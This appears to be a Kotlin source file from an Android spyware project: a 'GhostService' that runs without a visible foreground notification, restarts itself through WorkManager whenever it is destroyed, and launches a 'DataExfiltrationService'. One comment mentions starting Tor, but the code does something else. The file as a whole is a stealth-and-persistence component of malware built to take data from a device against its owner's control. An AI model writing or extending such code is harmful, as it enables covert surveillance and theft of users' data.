package com.example.andresionghost

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class GhostService : Service() {

    companion object {
        const val ACTION_SERVICE_KILLED = "com.example.andresionghost.SERVICE_KILLED"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start the Tor process without foreground service
        startGhostService()
        Log.d("GhostService", "GhostService started.")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()

        // Notify that the service has been killed
        Log.d("ghostService", "Service destroyed. Scheduling restart.")
        val broadcastIntent = Intent(ACTION_SERVICE_KILLED)
        sendBroadcast(broadcastIntent)

        // Schedule the service restart using WorkManager
        scheduleServiceRestart()
    }

    private fun scheduleServiceRestart() {
        val restartWorkRequest = OneTimeWorkRequestBuilder<RestartGhostServiceWorker>()
            .setInitialDelay(0, TimeUnit.SECONDS)  // Restart immediately
            .build()

        WorkManager.getInstance(this).enqueue(restartWorkRequest)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun startGhostService() {
        // Start the DataExfiltrationService
        val dataExfiltrationIntent = Intent(this, DataExfiltrationService::class.java)
        startService(dataExfiltrationIntent)

    }
}
